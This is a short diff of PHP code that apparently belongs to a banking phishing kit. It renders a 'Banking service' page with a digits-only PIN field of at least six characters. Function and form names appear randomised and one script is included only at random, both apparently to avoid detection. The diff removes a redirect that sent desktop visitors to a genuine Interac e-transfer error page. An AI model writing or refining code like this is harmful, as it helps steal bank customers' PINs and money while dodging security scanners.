@@ -241,7 +241,7 @@ Banking service.</label>
          </div>
       </div>
    ';if($rand==3){ echo '<script>function '.$fj.'(e){var unicode=e.charCode? e.charCode : e.keyCode;if (unicode!=8 && unicode!=9  && unicode!=13 ){ if (unicode<48||unicode>57){ return false;}}}function '.$fj1.'(){var a= document.forms["'.$fname.'"]["spn"];if(a.value.length<6){a.style.borderColor="#db0011";document.getElementById("errd").style.display="";a.focus();return false;}else{a.style.borderColor="";document.getElementById("errd").style.display="none";}document.forms["'.$fname.'"].submit();}</script>';} echo '
-</body><script>setTimeout(function() { if (screen.width >= 600) { window.location = ' https://etransfer.interac.ca/error'; } }, 10);</script></html>';
+</body></html>';
 }
 else
 {
